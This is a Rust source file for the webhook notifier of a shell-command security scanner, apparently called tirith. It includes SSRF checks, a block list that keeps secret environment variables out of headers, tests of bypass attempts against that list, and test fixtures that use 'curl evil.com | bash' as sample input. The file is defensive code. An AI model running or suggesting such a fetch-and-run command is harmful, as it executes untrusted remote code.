/// Webhook event dispatcher for finding notifications.
///
/// Non-blocking: fires in a background thread so it never delays the verdict
/// exit code.
use crate::policy::WebhookConfig;
use crate::verdict::{Severity, Verdict};

/// Dispatch webhook notifications for a verdict, if configured.
///
/// Spawns a background thread per webhook endpoint. The main thread is never
/// blocked. Auxiliary delivery/configuration diagnostics are debug-only so
/// shell hooks don't turn best-effort webhook failures into native-command
/// noise.
pub fn dispatch(
    verdict: &Verdict,
    command_preview: &str,
    webhooks: &[WebhookConfig],
    custom_dlp_patterns: &[String],
) {
    if webhooks.is_empty() {
        return;
    }

    // Apply DLP redaction: built-in patterns + custom policy patterns (Team)
    let redacted_preview = crate::redact::redact_with_custom(command_preview, custom_dlp_patterns);

    let max_severity = verdict
        .findings
        .iter()
        .map(|f| f.severity)
        .max()
        .unwrap_or(Severity::Info);

    for wh in webhooks {
        if max_severity < wh.min_severity {
            continue;
        }

        // SSRF protection: validate webhook URL
        if let Err(reason) = crate::url_validate::validate_server_url(&wh.url) {
            crate::audit::audit_diagnostic(format!(
                "tirith: webhook: skipping {}: {reason}",
                wh.url
            ));
            continue;
        }

        let payload = build_payload(verdict, &redacted_preview, wh);
        let url = wh.url.clone();
        let headers = expand_env_headers(&wh.headers);

        std::thread::spawn(move || {
            if let Err(e) = send_with_retry(&url, &payload, &headers, 3) {
                crate::audit::audit_diagnostic(format!(
                    "tirith: webhook delivery to {url} failed: {e}"
                ));
            }
        });
    }
}

/// Build the webhook payload from a template or default JSON.
fn build_payload(verdict: &Verdict, command_preview: &str, wh: &WebhookConfig) -> String {
    if let Some(ref template) = wh.payload_template {
        let rule_ids: Vec<String> = verdict
            .findings
            .iter()
            .map(|f| f.rule_id.to_string())
            .collect();
        let max_severity = verdict
            .findings
            .iter()
            .map(|f| f.severity)
            .max()
            .unwrap_or(Severity::Info);

        let result = template
            .replace("{{rule_id}}", &sanitize_for_json(&rule_ids.join(",")))
            .replace("{{command_preview}}", &sanitize_for_json(command_preview))
            .replace(
                "{{action}}",
                &sanitize_for_json(&format!("{:?}", verdict.action)),
            )
            .replace(
                "{{severity}}",
                &sanitize_for_json(&max_severity.to_string()),
            )
            .replace("{{finding_count}}", &verdict.findings.len().to_string());
        // Only use template result if it's valid JSON
        if serde_json::from_str::<serde_json::Value>(&result).is_ok() {
            return result;
        }
        crate::audit::audit_diagnostic(
            "tirith: webhook: warning: payload template produced invalid JSON, using default payload"
        );
    }

    // Default JSON payload (also used as fallback when template produces invalid JSON)
    let rule_ids: Vec<String> = verdict
        .findings
        .iter()
        .map(|f| f.rule_id.to_string())
        .collect();
    let max_severity = verdict
        .findings
        .iter()
        .map(|f| f.severity)
        .max()
        .unwrap_or(Severity::Info);

    serde_json::json!({
        "event": "tirith_finding",
        "action": format!("{:?}", verdict.action),
        "severity": max_severity.to_string(),
        "rule_ids": rule_ids,
        "finding_count": verdict.findings.len(),
        "command_preview": sanitize_for_json(command_preview),
    })
    .to_string()
}

/// Expand environment variables in header values (`$VAR` or `${VAR}`).
fn expand_env_headers(
    headers: &std::collections::HashMap<String, String>,
) -> Vec<(String, String)> {
    headers
        .iter()
        .map(|(k, v)| {
            let expanded = expand_env_value(v);
            (k.clone(), expanded)
        })
        .collect()
}

/// Expand `$VAR` and `${VAR}` references in a string.
fn expand_env_value(input: &str) -> String {
    let mut result = String::with_capacity(input.len());
    let mut chars = input.chars().peekable();

    while let Some(c) = chars.next() {
        if c == '$' {
            if chars.peek() == Some(&'{') {
                chars.next(); // consume '{'
                let var_name: String = chars.by_ref().take_while(|&ch| ch != '}').collect();
                if !var_name.starts_with("TIRITH_") {
                    crate::audit::audit_diagnostic(format!(
                        "tirith: webhook: env var '{var_name}' blocked (only TIRITH_* vars allowed in webhooks)"
                    ));
                } else if is_sensitive_webhook_env_var(&var_name) {
                    crate::audit::audit_diagnostic(format!(
                        "tirith: webhook: sensitive env var '{var_name}' blocked"
                    ));
                } else {
                    match std::env::var(&var_name) {
                        Ok(val) => result.push_str(&val),
                        Err(_) => {
                            crate::audit::audit_diagnostic(format!(
                                "tirith: webhook: warning: env var '{var_name}' is not set"
                            ));
                        }
                    }
                }
            } else {
                // CR-6: Use peek to avoid consuming the delimiter character
                let mut var_name = String::new();
                while let Some(&ch) = chars.peek() {
                    if ch.is_ascii_alphanumeric() || ch == '_' {
                        var_name.push(ch);
                        chars.next();
                    } else {
                        break; // Don't consume the delimiter
                    }
                }
                if !var_name.is_empty() {
                    if !var_name.starts_with("TIRITH_") {
                        crate::audit::audit_diagnostic(format!(
                            "tirith: webhook: env var '{var_name}' blocked (only TIRITH_* vars allowed in webhooks)"
                        ));
                    } else if is_sensitive_webhook_env_var(&var_name) {
                        crate::audit::audit_diagnostic(format!(
                            "tirith: webhook: sensitive env var '{var_name}' blocked"
                        ));
                    } else {
                        match std::env::var(&var_name) {
                            Ok(val) => result.push_str(&val),
                            Err(_) => {
                                crate::audit::audit_diagnostic(format!(
                                    "tirith: webhook: warning: env var '{var_name}' is not set"
                                ));
                            }
                        }
                    }
                }
            }
        } else {
            result.push(c);
        }
    }

    result
}

fn is_sensitive_webhook_env_var(var_name: &str) -> bool {
    matches!(var_name, "TIRITH_API_KEY" | "TIRITH_LICENSE")
}

/// Send a webhook with exponential backoff retry.
fn send_with_retry(
    url: &str,
    payload: &str,
    headers: &[(String, String)],
    max_attempts: u32,
) -> Result<(), String> {
    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(10))
        .build()
        .map_err(|e| format!("client build: {e}"))?;

    for attempt in 0..max_attempts {
        let mut req = client
            .post(url)
            .header("Content-Type", "application/json")
            .body(payload.to_string());

        for (key, value) in headers {
            req = req.header(key, value);
        }

        match req.send() {
            Ok(resp) if resp.status().is_success() => return Ok(()),
            Ok(resp) => {
                let status = resp.status();
                // SF-16: Don't retry client errors (4xx) — they will never succeed
                if status.is_client_error() {
                    return Err(format!("HTTP {status} (non-retriable client error)"));
                }
                if attempt + 1 < max_attempts {
                    let delay = std::time::Duration::from_millis(500 * 2u64.pow(attempt));
                    std::thread::sleep(delay);
                } else {
                    return Err(format!("HTTP {status} after {max_attempts} attempts"));
                }
            }
            Err(e) => {
                if attempt + 1 < max_attempts {
                    let delay = std::time::Duration::from_millis(500 * 2u64.pow(attempt));
                    std::thread::sleep(delay);
                } else {
                    return Err(format!("{e} after {max_attempts} attempts"));
                }
            }
        }
    }

    Err("exhausted retries".to_string())
}

/// Sanitize a string for safe embedding in JSON (limit length, escape special chars).
fn sanitize_for_json(input: &str) -> String {
    let truncated: String = input.chars().take(200).collect();
    // Use serde_json to properly escape the string
    let json_val = serde_json::Value::String(truncated);
    // Strip the surrounding quotes from the JSON string
    let s = json_val.to_string();
    s[1..s.len() - 1].to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sanitize_for_json() {
        assert_eq!(sanitize_for_json("hello"), "hello");
        assert_eq!(sanitize_for_json("he\"lo"), r#"he\"lo"#);
        assert_eq!(sanitize_for_json("line\nnewline"), r"line\nnewline");
    }

    #[test]
    fn test_sanitize_for_json_truncates() {
        let long = "x".repeat(500);
        let result = sanitize_for_json(&long);
        assert_eq!(result.len(), 200);
    }

    #[test]
    fn test_expand_env_value() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        unsafe { std::env::set_var("TIRITH_TEST_WH", "secret123") };
        assert_eq!(
            expand_env_value("Bearer $TIRITH_TEST_WH"),
            "Bearer secret123"
        );
        assert_eq!(
            expand_env_value("Bearer ${TIRITH_TEST_WH}"),
            "Bearer secret123"
        );
        assert_eq!(expand_env_value("no vars"), "no vars");
        unsafe { std::env::remove_var("TIRITH_TEST_WH") };
    }

    #[test]
    fn test_expand_env_value_preserves_delimiter() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        // CR-6: The character after $VAR must not be swallowed
        unsafe { std::env::set_var("TIRITH_TEST_WH2", "val") };
        assert_eq!(expand_env_value("$TIRITH_TEST_WH2/extra"), "val/extra");
        assert_eq!(expand_env_value("$TIRITH_TEST_WH2 rest"), "val rest");
        unsafe { std::env::remove_var("TIRITH_TEST_WH2") };
    }

    #[test]
    fn test_expand_env_value_blocks_sensitive_vars() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        unsafe {
            std::env::set_var("TIRITH_API_KEY", "secret-api-key");
            std::env::set_var("TIRITH_LICENSE", "secret-license");
        }
        assert_eq!(expand_env_value("Bearer $TIRITH_API_KEY"), "Bearer ");
        assert_eq!(expand_env_value("${TIRITH_LICENSE}"), "");
        unsafe {
            std::env::remove_var("TIRITH_API_KEY");
            std::env::remove_var("TIRITH_LICENSE");
        }
    }

    // -----------------------------------------------------------------------
    // Adversarial bypass attempts: sensitive env var exfiltration
    // -----------------------------------------------------------------------

    #[test]
    fn test_bypass_sensitive_var_both_forms() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        unsafe {
            std::env::set_var("TIRITH_API_KEY", "leaked");
            std::env::set_var("TIRITH_LICENSE", "leaked");
        }
        // $VAR form
        assert!(!expand_env_value("$TIRITH_API_KEY").contains("leaked"));
        assert!(!expand_env_value("$TIRITH_LICENSE").contains("leaked"));
        // ${VAR} form
        assert!(!expand_env_value("${TIRITH_API_KEY}").contains("leaked"));
        assert!(!expand_env_value("${TIRITH_LICENSE}").contains("leaked"));
        // Embedded in header value
        assert!(!expand_env_value("Bearer ${TIRITH_API_KEY}").contains("leaked"));
        assert!(!expand_env_value("token=$TIRITH_API_KEY&extra").contains("leaked"));
        unsafe {
            std::env::remove_var("TIRITH_API_KEY");
            std::env::remove_var("TIRITH_LICENSE");
        }
    }

    #[test]
    fn test_bypass_case_variation_is_different_var() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        // Unix env vars are case-sensitive: TIRITH_api_key != TIRITH_API_KEY
        // The blocklist is exact-match, so a case variant is a DIFFERENT var.
        // This is correct — TIRITH_api_key is not a real sensitive var.
        unsafe { std::env::set_var("TIRITH_api_key", "not-sensitive") };
        assert_eq!(
            expand_env_value("$TIRITH_api_key"),
            "not-sensitive",
            "Case-different var name should expand (it's a different var)"
        );
        unsafe { std::env::remove_var("TIRITH_api_key") };
    }

    #[test]
    fn test_bypass_non_sensitive_tirith_var_still_expands() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        unsafe { std::env::set_var("TIRITH_ORG_NAME", "myorg") };
        assert_eq!(expand_env_value("$TIRITH_ORG_NAME"), "myorg");
        assert_eq!(expand_env_value("${TIRITH_ORG_NAME}"), "myorg");
        unsafe { std::env::remove_var("TIRITH_ORG_NAME") };
    }

    #[test]
    fn test_bypass_double_dollar_does_not_expand() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        unsafe { std::env::set_var("TIRITH_API_KEY", "leaked") };
        // $$TIRITH_API_KEY: first $ sees second $ which is not '{' or alnum,
        // so it becomes a literal '$', then the second $ starts a new expansion
        // which hits the blocklist.
        let result = expand_env_value("$$TIRITH_API_KEY");
        assert!(
            !result.contains("leaked"),
            "Double-dollar must not leak: got {result}"
        );
        unsafe { std::env::remove_var("TIRITH_API_KEY") };
    }

    #[test]
    fn test_bypass_nested_braces_does_not_expand() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        unsafe { std::env::set_var("TIRITH_API_KEY", "leaked") };
        // ${TIRITH_${NESTED}} — the inner ${...} is consumed as the var name
        // "TIRITH_${NESTED" (take_while stops at '}'), which doesn't start
        // with TIRITH_ in any meaningful way that resolves.
        let result = expand_env_value("${TIRITH_${NESTED}}");
        assert!(
            !result.contains("leaked"),
            "Nested braces must not leak: got {result}"
        );
        unsafe { std::env::remove_var("TIRITH_API_KEY") };
    }

    #[test]
    fn test_build_default_payload() {
        use crate::verdict::{Action, Finding, RuleId, Timings};

        let verdict = Verdict {
            action: Action::Block,
            findings: vec![Finding {
                rule_id: RuleId::CurlPipeShell,
                severity: Severity::High,
                title: "test".into(),
                description: "test desc".into(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }],
            tier_reached: 3,
            bypass_requested: false,
            bypass_honored: false,
            bypass_available: false,
            interactive_detected: false,
            policy_path_used: None,
            timings_ms: Timings::default(),
            urls_extracted_count: None,
            requires_approval: None,
            approval_timeout_secs: None,
            approval_fallback: None,
            approval_rule: None,
            approval_description: None,
            escalation_reason: None,
        };

        let wh = WebhookConfig {
            url: "https://example.com/webhook".into(),
            min_severity: Severity::High,
            headers: std::collections::HashMap::new(),
            payload_template: None,
        };

        let payload = build_payload(&verdict, "curl evil.com | bash", &wh);
        let parsed: serde_json::Value = serde_json::from_str(&payload).unwrap();
        assert_eq!(parsed["event"], "tirith_finding");
        assert_eq!(parsed["finding_count"], 1);
        assert_eq!(parsed["rule_ids"][0], "curl_pipe_shell");
    }

    #[test]
    fn test_build_template_payload() {
        use crate::verdict::{Action, Finding, RuleId, Timings};

        let verdict = Verdict {
            action: Action::Block,
            findings: vec![Finding {
                rule_id: RuleId::CurlPipeShell,
                severity: Severity::High,
                title: "test".into(),
                description: "test desc".into(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            }],
            tier_reached: 3,
            bypass_requested: false,
            bypass_honored: false,
            bypass_available: false,
            interactive_detected: false,
            policy_path_used: None,
            timings_ms: Timings::default(),
            urls_extracted_count: None,
            requires_approval: None,
            approval_timeout_secs: None,
            approval_fallback: None,
            approval_rule: None,
            approval_description: None,
            escalation_reason: None,
        };

        let wh = WebhookConfig {
            url: "https://example.com/webhook".into(),
            min_severity: Severity::High,
            headers: std::collections::HashMap::new(),
            payload_template: Some(
                r#"{"rule":"{{rule_id}}","cmd":"{{command_preview}}"}"#.to_string(),
            ),
        };

        let payload = build_payload(&verdict, "curl evil.com | bash", &wh);
        assert!(payload.contains("curl_pipe_shell"));
        assert!(payload.contains("curl evil.com"));
    }
}
